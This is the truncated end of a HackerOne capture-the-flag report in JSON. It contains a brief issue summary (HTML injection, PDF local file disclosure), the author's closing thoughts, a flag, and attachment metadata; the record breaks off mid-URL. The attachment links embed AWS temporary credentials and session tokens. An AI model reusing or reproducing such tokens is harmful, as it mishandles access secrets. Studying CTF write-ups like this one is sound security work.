data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/439/678/98c5aa7894be1ec2e33f945040e5ffce1ffbc4e1/pdfize.pdf?response-content-disposition=attachment%3B%20filename%3D%22pdfize.pdf%22%3B%20filename%2A%3DUTF-8%27%27pdfize.pdf\u0026amp;response-content-type=application%2Fpdf\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQYCKXWVJV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061201Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDA49PdtQjNwsmxuqXkUfx4reZ7FOIjOQweezWE1XNVvgIhAIx4Xhhh4XlvyIhDJdSEbmB96vDM5LCgXwGSfRM7F1iGKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igyn15lTDq2bI47AdVUqkQNMLcSRNdoLgSjMqfZWfS2MON26yye1i89YSblnHhNnmmD%2BCvb9yhqbaahpmKHBn3USgduRumLTV9NLIU7btFJI3aDtP%2FlWAUoPbX2QxPMxkJvic1ajY8aoF%2BnP%2Fk5UKukHF6D5Is0Fl3Ml%2BqRxmX1yWQTr3H8jccJZ6aCDwhBSY3iZbIjaXYPaWMislYIuYKKUaLL%2F%2FYtKvtqaU%2FJGIKdF0f6x2tCHDbPS827MCNRm0untsD%2FJzgKRNU1mRAA87%2BCkBpJKyJTehTat9%2F%2FN1nYNPFuZPiPZaAFHHLfjwSlmUUMt%2FjoBjH%2Fcyea8UZK0pA5Axz%2Fm0f%2B7vbWepdX7D%2BvGEghnkHR0Oe7JTNRrWnUe20hFtN2VX6fIFqm9o3ZNb5%2BD8rX67vlWEUKhs5kSGlyl9lGQ8eFTM41lWO%2F5Cj6DFNQF7PQ4bl85VypcyQ6hS%2FKzmgaXGJwEUyiknMXmQ%2BRjTRRFvw0kG2TaqDSXcr%2FcdXxN5FVFJsxMfo%2BqrTaGgGf8R88RwwIpSqqo0RKqA2Xh0TCcz6r%2FBTrqAUDBHv70zc1wQG84KmYipl4mNsyVGxUMZh3CsgQjwXY%2Fv6h62iMoRu%2F5MESZoXSTR0hNz9M95%2Fn2q%2BB8n8cjdZLS9WuYTCTYcrPyBfvG6lGVHQJ%2FCFMt0nOaRJepHaeOrZ8ixXpq%2FKU9YvFEk83zuOnTYxYm5hwxl37Sww%2FXZJHw2r23uHUmo8TMaZnWQj29AdMGqkOeoWqYjNS4Q3K3et0tfgVM4UMSCi28eH0lBYtC56QeRUk3j%2Brsw4LY0o%2FlP7RXyGFceiJ7fG0HRIst91IOe7KULe4yg3%2FgRBW2zW4bXrpvrkp3CnURtw%3D%3D\u0026amp;X-Amz-Signature=6bec9c1bfe61e1cfa95c9a4b15c1ec3c1fbbee71bf9d6653365ab8cd9af95ec1\" data-attachment-type=\"application/pdf\"\u003epdfize.pdf (F439678)\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch3 id=\"summary-of-issues\"\u003eSummary of Issues:\u003c/h3\u003e\n\n\u003cul\u003e\n\u003cli\u003eHTML injection via insufficient input validation and sanitization\u003c/li\u003e\n\u003cli\u003ePDF rendering Local File Disclosure\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch1 id=\"closing-thoughts\"\u003eClosing thoughts\u003c/h1\u003e\n\n\u003cp\u003eWhilst the narrative presented here is the most direct route I \u003cem\u003ecould\u003c/em\u003e have taken to complete this CTF, it does gloss over the many hours of failure, rabbit holes dived into and red herrings chased. It specifically does not mention the many millions of requests made in vain whist attempting to guess query string parameters. It 100% ignores the day spent attempting to perform a timing attack to guess single characters at a time (instead of bytes). And it fails to reveal the full time spent scripting up character recognition when a pen and paper would have done the job just as well in less than 1/10 of the time.\u003c/p\u003e\n\n\u003cp\u003eI learned a huge amount participating, and failing hard, in this CTF and fortified my toolkit with many new and revised tools (\u003ca href=\"/redirect?url=https%3A%2F%2Fgist.github.com%2Fajxchapman%2Fb7baca094e61ff120c44379029646b97\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eavailable here for you to try too\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e). Thanks to @Hacker0x01 and \u003ca href=\"/daeken\"\u003e@daeken\u003c/a\u003e for putting this challenge together!\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eFlag is \u003ccode\u003ec8889970d9fb722066f31e804e351993\u003c/code\u003e, thanks for the challenge!\u003c/p\u003e\n","original_report_id":null,"original_report_url":null,"attachments":[{"id":439676,"file_name":"application.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/439/676/56bffd9ef1bb9c165010175dbbf23ab08e841add/application.png?response-content-disposition=attachment%3B%20filename%3D%22application.png%22%3B%20filename%2A%3DUTF-8%27%27application.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYCKXWVJV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061201Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDA49PdtQjNwsmxuqXkUfx4reZ7FOIjOQweezWE1XNVvgIhAIx4Xhhh4XlvyIhDJdSEbmB96vDM5LCgXwGSfRM7F1iGKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igyn15lTDq2bI47AdVUqkQNMLcSRNdoLgSjMqfZWfS2MON26yye1i89YSblnHhNnmmD%2BCvb9yhqbaahpmKHBn3USgduRumLTV9NLIU7btFJI3aDtP%2FlWAUoPbX2QxPMxkJvic1ajY8aoF%2BnP%2Fk5UKukHF6D5Is0Fl3Ml%2BqRxmX1yWQTr3H8jccJZ6aCDwhBSY3iZbIjaXYPaWMislYIuYKKUaLL%2F%2FYtKvtqaU%2FJGIKdF0f6x2tCHDbPS827MCNRm0untsD%2FJzgKRNU1mRAA87%2BCkBpJKyJTehTat9%2F%2FN1nYNPFuZPiPZaAFHHLfjwSlmUUMt%2FjoBjH%2Fcyea8UZK0pA5Axz%2Fm0f%2B7vbWepdX7D%2BvGEghnkHR0Oe7JTNRrWnUe20hFtN2VX6fIFqm9o3ZNb5%2BD8rX67vlWEUKhs5kSGlyl9lGQ8eFTM41lWO%2F5Cj6DFNQF7PQ4bl85VypcyQ6hS%2FKzmgaXGJwEUyiknMXmQ%2BRjTRRFvw0kG2TaqDSXcr%2FcdXxN5FVFJsxMfo%2BqrTaGgGf8R88RwwIpSqqo0RKqA2Xh0TCcz6r%2FBTrqAUDBHv70zc1wQG84KmYipl4mNsyVGxUMZh3CsgQjwXY%2Fv6h62iMoRu%2F5MESZoXSTR0hNz9M95%2Fn2q%2BB8n8cjdZLS9WuYTCTYcrPyBfvG6lGVHQJ%2FCFMt0nOaRJepHaeOrZ8ixXpq%2FKU9YvFEk83zuOnTYxYm5hwxl37Sww%2FXZJHw2r23uHUmo8TMaZnWQj29AdMGqkOeoWqYjNS4Q3K3et0tfgVM4UMSCi28eH0lBYtC56QeRUk3j%2Brsw4LY0o%2FlP7RXyGFceiJ7fG0HRIst91IOe7KULe4yg3%2FgRBW2zW4bXrpvrkp3CnURtw%3D%3D\u0026X-Amz-Signature=b1e40a6ec870029c702c21e45a56abd6518cb49cfd5966b251a4909a20176ef8","file_size":32453,"type":"image/png"},{"id":439677,"file_name":"embeddedfile.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/439/677/0bb9795e1077ad38da22b2e8dbae881ed409e859/embeddedfile.png?response-content-disposition=attachment%3B%20filename%3D%22embeddedfile.png%22%3B%20filename%2A%3DUTF-8%27%27embeddedfile.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYCKXWVJV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061201Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDA49PdtQjNwsmxuqXkUfx4reZ7FOIjOQweezWE1XNVvgIhAIx4Xhhh4XlvyIhDJdSEbmB96vDM5LCgXwGSfRM7F1iGKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igyn15lTDq2bI47AdVUqkQNMLcSRNdoLgSjMqfZWfS2MON26yye1i89YSblnHhNnmmD%2BCvb9yhqbaahpmKHBn3USgduRumLTV9NLIU7btFJI3aDtP%2FlWAUoPbX2QxPMxkJvic1ajY8aoF%2BnP%2Fk5UKukHF6D5Is0Fl3Ml%2BqRxmX1yWQTr3H8jccJZ6aCDwhBSY3iZbIjaXYPaWMislYIuYKKUaLL%2F%2FYtKvtqaU%2FJGIKdF0f6x2tCHDbPS827MCNRm0untsD%2FJzgKRNU1mRAA87%2BCkBpJKyJTehTat9%2F%2FN1nYNPFuZPiPZaAFHHLfjwSlmUUMt%2FjoBjH%2Fcyea8UZK0pA5Axz%2Fm0f%2B7vbWepdX7D%2BvGEghnkHR0Oe7JTNRrWnUe20hFtN2VX6fIFqm9o3ZNb5%2BD8rX67vlWEUKhs5kSGlyl9lGQ8eFTM41lWO%2F5Cj6DFNQF7PQ4bl85VypcyQ6hS%2FKzmgaXGJwEUyiknMXmQ%2BRjTRRFvw0kG2TaqDSXcr%2FcdXxN5FVFJsxMfo%2BqrTaGgGf8R88RwwIpSqqo0RKqA2Xh0TCcz6r%2FBTrqAUDBHv70zc1wQG84KmYipl4mNsyVGxUMZh3CsgQjwXY%2Fv6h62iMoRu%2F5MESZoXSTR0hNz9M95%2Fn2q%2BB8n8cjdZLS9WuYTCTYcrPyBfvG6lGVHQJ%2FCFMt0nOaRJepHaeOrZ8ixXpq%2FKU9YvFEk83zuOnTYxYm5hwxl37Sww%2FXZJHw2r23uHUmo8TMaZnWQj29AdMGqkOeoWqYjNS4Q3K3et0tfgVM4UMSCi28eH0lBYtC56QeRUk3j%2Brsw4LY0o%2FlP7RXyGFceiJ7fG0HRIst91IOe7KULe4yg3%2FgRBW2zW4bXrpvrkp3CnURtw%3D%3D\u0026X-Amz-Signature=23a79a058d7af0cdb5296c51455d9a17ba01e76268a26fa427b00ed2c2fd465b","file_size":119351,"type":"image/png"},{"id":439678,"file_name":"pdfize.pdf","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/439/678/98c5aa7894be1ec2e33f945040e5ffce1ffbc4e1/pdfize.pdf?response-content-disposition=attachment%3B%20filename%3D%22pdfize.pdf%22%3B%20filename%2A%3DUTF-8%27%27pdfize.pdf\u0026response-content-type=application%2Fpdf\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYCKXWVJV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061201Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDA49PdtQjNwsmxuqXkUfx4reZ7FOIjOQweezWE1XNVvgIhAIx4Xhhh4XlvyIhDJdSEbmB96vDM5LCgXwGSfRM7F1iGKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igyn15lTDq2bI47AdVUqkQNMLcSRNdoLgSjMqfZWfS2MON26yye1i89YSblnHhNnmmD%2BCvb9yhqbaahpmKHBn3USgduRumLTV9NLIU7btFJI3aDtP%2FlWAUoPbX2QxPMxkJvic1ajY8aoF%2BnP%2Fk5UKukHF6D5Is0Fl3Ml%2BqRxmX1yWQTr3H8jccJZ6aCDwhBSY3iZbIjaXYPaWMislYIuYKKUaLL%2F%2FYtKvtqaU%2FJGIKdF0f6x2tCHDbPS827MCNRm0untsD%2FJzgKRNU1mRAA87%2BCkBpJKyJTehTat9%2F%2FN1nYNPFuZPiPZaAFHHLfjwSlmUUMt%2FjoBjH%2Fcyea8UZK0pA5Axz%2Fm0f%2B7vbWepdX7D%2BvGEghnkHR0Oe7JTNRrWnUe20hFtN2VX6fIFqm9o3ZNb5%2BD8rX67vlWEUKhs5kSGlyl9lGQ8eFTM41lWO%2F5Cj6DFNQF7PQ4bl85VypcyQ6hS%2FKzmgaXGJwEUyiknMXmQ%2BRjTRRFvw0kG2TaqDSXcr%2FcdXxN5FVFJsxMfo%2BqrTaGgGf8R88RwwIpSqqo0RKqA2Xh0TCcz6r%2FBTrqAUDBHv70zc1wQG84KmYipl4mNsyVGxUMZh3CsgQjwXY%2Fv6h62iMoRu%2F5MESZoXSTR0hNz9M95%2Fn2q%2BB8n8cjdZLS9WuYTCTYcrPyBfvG6lGVHQJ%2FCFMt0nOaRJepHaeOrZ8ixXpq%2FKU9YvFEk83zuOnTYxYm5hwxl37Sww%2FXZJHw2r23uHUmo8TMaZnWQj29AdMGqkOeoWqYjNS4Q3K3et0tfgVM4UMSCi28eH0lBYtC56QeRUk3j%2Brsw4LY0o%2FlP7RXyGFceiJ7fG0HRIst91IOe7KULe4yg3%2FgRBW2zW4bXrpvrkp3CnURtw%3D%3D\u0026X-Amz-Signature=6bec9c1bfe61e1cfa95c9a4b15c1ec3c1fbbee71bf9d6653365ab8cd9af95ec1","file_size":21974,"type":"application/pdf"},{"id":439679,"file_name":"shell.cast","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/439/679/94c501a3eebdf0bab1493be1e44b274ab49d83c2/shell.cast?response-content-disposition=attachment%3B%20filename%3D%22shell.cast%22%3B%20filename%2A%3DUTF-8%27%27shell.cast\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYCKXWVJV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061201Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDA49PdtQjNwsmxuqXkUfx4reZ7FOIjOQweezWE1XNVvgIhAIx4Xhhh4XlvyIhDJdSEbmB96vDM5LCgXwGSfRM7F1iGKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igyn15lTDq2bI47AdVUqkQNMLcSRNdoLgSjMqfZWfS2MON26yye1i89YSblnHhNnmmD%2BCvb9yhqbaahpmKHBn3USgduRumLTV9NLIU7btFJI3aDtP%2FlWAUoPbX2QxPMxkJvic1ajY8aoF%2BnP%2Fk5UKukHF6D5Is0Fl3Ml%2BqRxmX1yWQTr3H8jccJZ6aCDwhBSY3iZbIjaXYPaWMislYIuYKKUaLL%2F%2FYtKvtqaU%2FJGIKdF0f6x2tCHDbPS827MCNRm0untsD%2FJzgKRNU1mRAA87%2BCkBpJKyJTehTat9%2F%2FN1nYNPFuZPiPZaAFHHLfjwSlmUUMt%2FjoBjH%2Fcyea8UZK0pA5Axz%2Fm0f%2B7vbWepdX7D%2BvGEghnkHR0Oe7JTNRrWnUe20hFtN2VX6fIFqm9o3ZNb5%2BD8rX67vlWEUKhs5kSGlyl9lGQ8eFTM41lWO%2F5Cj6DFNQF7PQ4bl85VypcyQ6hS%2FKzmgaXGJwEUyiknMXmQ%2BRjTRRFvw0kG2TaqDSXcr%2FcdXxN5FVFJsxMfo%2BqrTaGgGf8R88RwwIpSqqo0RKqA2Xh0TCcz6r%2FBTrqAUDBHv70zc1wQG84KmYipl4mNsyVGxUMZh3CsgQjwXY%2Fv6h62iMoRu%2F5MESZoXSTR0hNz9M95%2Fn2q%2BB8n8cjdZLS9WuYTCTYcrPyBfvG6lGVHQJ%2FCFMt0nOaRJepHaeOrZ8ixXpq%2FKU9YvFEk83zuOnTYxYm5hwxl37Sww%2FXZJHw2r23uHUmo8TMaZnWQj29AdMGqkOeoWqYjNS4Q3K3et0tfgVM4UMSCi28eH0lBYtC56QeRUk3j%2Brsw4LY0o%2FlP7RXyGFceiJ7fG0HRIst91IOe7KULe4yg3%2FgRBW2zW4bXrpvrkp3CnURtw%3D%3D\u0026X-Amz-Signature=eaf09897b423c675061d147a13ee42ff79d91254f7684a414c2daf3e3286ca44","file_size":4353,"type":"text/plain"},{"id":439680,"file_name":"shell.gif","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/439/680/8080745b46e475661f27c11cb034f32af9749aac/shell.gif?response-content-disposition=attachment%3B%20filename%3D%22shell.gif%22%3B%20filename%2A%3DUTF-8%27%27shell.gif\u0026response-content-type=image%2Fgif\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYCKXWVJV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061201Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDA49PdtQjNwsmxuqXkUfx4reZ7FOIjOQweezWE1XNVvgIhAIx4Xhhh4XlvyIhDJdSEbmB96vDM5LCgXwGSfRM7F1iGKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igyn15lTDq2bI47AdVUqkQNMLcSRNdoLgSjMqfZWfS2MON26yye1i89YSblnHhNnmmD%2BCvb9yhqbaahpmKHBn3USgduRumLTV9NLIU7btFJI3aDtP%2FlWAUoPbX2QxPMxkJvic1ajY8aoF%2BnP%2Fk5UKukHF6D5Is0Fl3Ml%2BqRxmX1yWQTr3H8jccJZ6aCDwhBSY3iZbIjaXYPaWMislYIuYKKUaLL%2F%2FYtKvtqaU%2FJGIKdF0f6x2tCHDbPS827MCNRm0untsD%2FJzgKRNU1mRAA87%2BCkBpJKyJTehTat9%2F%2FN1nYNPFuZPiPZaAFHHLfjwSlmUUMt%2FjoBjH%2Fcyea8UZK0pA5Axz%2Fm0f%2B7vbWepdX7D%2BvGEghnkHR0Oe7JTNRrWnUe20hFtN2VX6fIFqm9o3ZNb5%2BD8rX67vlWEUKhs5kSGlyl9lGQ8eFTM41lWO%2F5Cj6DFNQF7PQ4bl85VypcyQ6hS%2FKzmgaXGJwEUyiknMXmQ%2BRjTRRFvw0kG2TaqDSXcr%2FcdXxN5FVFJsxMfo%2BqrTaGgGf8R88RwwIpSqqo0RKqA2Xh0TCcz6r%2FBTrqAUDBHv70zc1wQG84KmYipl4mNsyVGxUMZh3CsgQjwXY%2Fv6h62iMoRu%2F5MESZoXSTR0hNz9M95%2Fn2q%2BB8n8cjdZLS9WuYTCTYcrPyBfvG6lGVHQJ%2FCFMt0nOaRJepHaeOrZ8ixXpq%2FKU9YvFEk83zuOnTYxYm5hwxl37Sww%2FXZJHw2r23uHUmo8TMaZnWQj29AdMGqkOeoWqYjNS4Q3K3et0tfgVM4UMSCi28eH0lBYtC56QeRUk3j%2Brsw4LY0o%2FlP7RXyGFceiJ7fG0HRIst91IOe7KULe4yg3%2FgRBW2zW4bXrpvrkp3CnURtw%3D%3D\u0026X-Amz-Signature=a17130e72ac5d5b34d49221ee5432a63d55ab9d2798f79d752625054f90654d6","file_size":275170,"type":"image/gif"},{"id":439681,"file_name":"android_x86.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/439/681/db796ab88d1535900c5dd5c97649273e943d8756/android_x86.png?response-content-disposition=attachment%3B%20filename%3D%22android_x86.png%22%3B%20filename%2A%3DUTF-8%27%27android_x86.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYCKXWVJV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061201Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDA49PdtQjNwsmxuqXkUfx4reZ7FOIjOQweezWE1XNVvgIhAIx4Xhhh4XlvyIhDJdSEbmB96vDM5LCgXwGSfRM7F1iGKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igyn15lTDq2bI47AdVUqkQNMLcSRNdoLgSjMqfZWfS2MON26yye1i89YSblnHhNnmmD%2BCvb9yhqbaahpmKHBn3USgduRumLTV9NLIU7btFJI3aDtP%2FlWAUoPbX2QxPMxkJvic1ajY8aoF%2BnP%2Fk5UKukHF6D5Is0Fl3Ml%2BqRxmX1yWQTr3H8jccJZ6aCDwhBSY3iZbIjaXYPaWMislYIuYKKUaLL%2F%2FYtKvtqaU%2FJGIKdF0f6x2tCHDbPS827MCNRm0untsD%2FJzgKRNU1mRAA87%2BCkBpJKyJTehTat9%2F%2FN1nYNPFuZPiPZaAFHHLfjwSlmUUMt%2FjoBjH%2Fcyea8UZK0pA5Axz%2Fm0f%2B7vbWepdX7D%2BvGEghnkHR0Oe7JTNRrWnUe20hFtN2VX6fIFqm9o3ZNb5%2BD8rX67vlWEUKhs5kSGlyl9lGQ8eFTM41lWO%2F5Cj6DFNQF7PQ4bl85VypcyQ6hS%2FKzmgaXGJwEUyiknMXmQ%2BRjTRRFvw0kG2TaqDSXcr%2FcdXxN5FVFJsxMfo%2BqrTaGgGf8R88RwwIpSqqo0RKqA2Xh0TCcz6r%2FBTrqAUDBHv70zc1wQG84KmYipl4mNsyVGxUMZh3CsgQjwXY%2Fv6h62iMoRu%2F5MESZoXSTR0hNz9M95%2Fn2q%2BB8n8cjdZLS9WuYTCTYcrPyBfvG6lGVHQJ%2FCFMt0nOaRJepHaeOrZ8ixXpq%2FKU9YvFEk83zuOnTYxYm5hwxl37Sww%2FXZJHw2r23uHUmo8TMaZnWQj29AdMGqkOeoWqYjNS4Q3K3et0tfgVM4UMSCi28eH0lBYtC56QeRUk3j%2Brsw4LY0o%2FlP7RXyGFceiJ7fG0HRIst91IOe7KULe4yg3%2FgRBW2zW4bXrpvrkp3CnURtw%3D%3D\u0026X-Amz-Signature=d96e14a762a3ee50fd3bb9d38c407e0f84b1e60988a31572932b284232448d18","file_size":35719,"type":"image/png"},{"id":439682,"file_name":"image_annotated.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/439/682/0ecf0ba78d777448026875d0a7e5836dd867128b/image_annotated.png?response-content-disposition=attachment%3B%20filename%3D%22image_annotated.png%22%3B%20filename%2A%3DUTF-8%27%27image_annotated.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYCKXWVJV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061201Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDA49PdtQjNwsmxuqXkUfx4reZ7FOIjOQweezWE1XNVvgIhAIx4Xhhh4XlvyIhDJdSEbmB96vDM5LCgXwGSfRM7F1iGKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igyn15lTDq2bI47AdVUqkQNMLcSRNdoLgSjMqfZWfS2MON26yye1i89YSblnHhNnmmD%2BCvb9yhqbaahpmKHBn3USgduRumLTV9NLIU7btFJI3aDtP%2FlWAUoPbX2QxPMxkJvic1ajY8aoF%2BnP%2Fk5UKukHF6D5Is0Fl3Ml%2BqRxmX1yWQTr3H8jccJZ6aCDwhBSY3iZbIjaXYPaWMislYIuYKKUaLL%2F%2FYtKvtqaU%2FJGIKdF0f6x2tCHDbPS827MCNRm0untsD%2FJzgKRNU1mRAA87%2BCkBpJKyJTehTat9%2F%2FN1nYNPFuZPiPZaAFHHLfjwSlmUUMt%2FjoBjH%2Fcyea8UZK0pA5Axz%2Fm0f%2B7vbWepdX7D%2BvGEghnkHR0Oe7JTNRrWnUe20hFtN2VX6fIFqm9o3ZNb5%2BD8rX67vlWEUKhs5kSGlyl9lGQ8eFTM41lWO%2F5Cj6DFNQF7PQ4bl85VypcyQ6hS%2FKzmgaXGJwEUyiknMXmQ%2BRjTRRFvw0kG2TaqDSXcr%2FcdXxN5FVFJsxMfo%2BqrTaGgGf8R88RwwIpSqqo0RKqA2Xh0TCcz6r%2FBTrqAUDBHv70zc1wQG84KmYipl4mNsyVGxUMZh3CsgQjwXY%2Fv6h62iMoRu%2F5MESZoXSTR0hNz9M95%2Fn2q%2BB8n8cjdZLS9WuYTCTYcrPyBfvG6lGVHQJ%2FCFMt0nOaRJepHaeOrZ8ixXpq%2FKU9YvFEk83zuOnTYxYm5hwxl37Sww%2FXZJHw2r23uHUmo8TMaZnWQj29AdMGqkOeoWqYjNS4Q3K3et0tfgVM4UMSCi28eH0lBYtC56QeRUk3j%2Brsw4LY0o%2FlP7RXyGFceiJ7fG0HRIst91IOe7KULe4yg3%2FgRBW2zW4bXrpvrkp3CnURtw%3D%3D\u0026X-Amz-Signature=7247193705a0fc39f17b12ac4672e2fd66f10711ab9c5ce0f2685596d4a310d7","file_size":843271,"type":"image/png"},{"id":439685,"file_name":"main_2.py","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/439/685/fe32b5b8d7c8b6e43a558e73eef574c6194a5545/main_2.py?response-content-disposition=attachment%3B%20filename%3D%22main_2.py%22%3B%20filename%2A%3DUTF-8%27%27main_2.py\u0026response-content-type=text%2Fx-python\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYCKXWVJV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061201Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDA49PdtQjNwsmxuqXkUfx4reZ7FOIjOQweezWE1XNVvgIhAIx4Xhhh4XlvyIhDJdSEbmB96vDM5LCgXwGSfRM7F1iGKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igyn15lTDq2bI47AdVUqkQNMLcSRNdoLgSjMqfZWfS2MON26yye1i89YSblnHhNnmmD%2BCvb9yhqbaahpmKHBn3USgduRumLTV9NLIU7btFJI3aDtP%2FlWAUoPbX2QxPMxkJvic1ajY8aoF%2BnP%2Fk5UKukHF6D5Is0Fl3Ml%2BqRxmX1yWQTr3H8jccJZ6aCDwhBSY3iZbIjaXYPaWMislYIuYKKUaLL%2F%2FYtKvtqaU%2FJGIKdF0f6x2tCHDbPS827MCNRm0untsD%2FJzgKRNU1mRAA87%2BCkBpJKyJTehTat9%2F%2FN1nYNPFuZPiPZaAFHHLfjwSlmUUMt%2FjoBjH%2Fcyea8UZK0pA5Axz%2Fm0f%2B7vbWepdX7D%2BvGEghnkHR0Oe7JTNRrWnUe20hFtN2VX6fIFqm9o3ZNb5%2BD8rX67vlWEUKhs5kSGlyl9lGQ8eFTM41lWO%2F5Cj6DFNQF7PQ4bl85VypcyQ6hS%2FKzmgaXGJwEUyiknMXmQ%2BRjTRRFvw0kG2TaqDSXcr%2FcdXxN5FVFJsxMfo%2BqrTaGgGf8R88RwwIpSqqo0RKqA2Xh0TCcz6r%2FBTrqAUDBHv70zc1wQG84KmYipl4mNsyVGxUMZh3CsgQjwXY%2Fv6h62iMoRu%2F5MESZoXSTR0hNz9M95%2Fn2q%2BB8n8cjdZLS9WuYTCTYcrPyBfvG6lGVHQJ%2FCFMt0nOaRJepHaeOrZ8ixXpq%2FKU9YvFEk83zuOnTYxYm5hwxl37Sww%2FXZJHw2r23uHUmo8TMaZnWQj29AdMGqkOeoWqYjNS4Q3K3et0tfgVM4UMSCi28eH0lBYtC56QeRUk3j%2Brsw4LY0o%2FlP7RXyGFceiJ7fG0HRIst91IOe7KULe4yg3%2FgRBW2zW4bXrpvrkp3CnURtw%3D%3D\u0026X-Amz-Signature=f5da345330f8b6c06159ba2be086551349cf8d9460503153e18512195d224ddb","file_size":2694,"type":"text/x-python"},{"id":439686,"file_name":"main_3.py","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/439/686/78c7791fb76a9d668d9f88c25c587061ce8e7e86/main_3.py?response-content-disposition=attachment%3B%20filename%3D%22main_3.py%22%3B%20filename%2A%3DUTF-8%27%27main_3.py\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYCKXWVJV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061201Z\u0026X-Amz-Expires=3600\u0026X-Amz-Si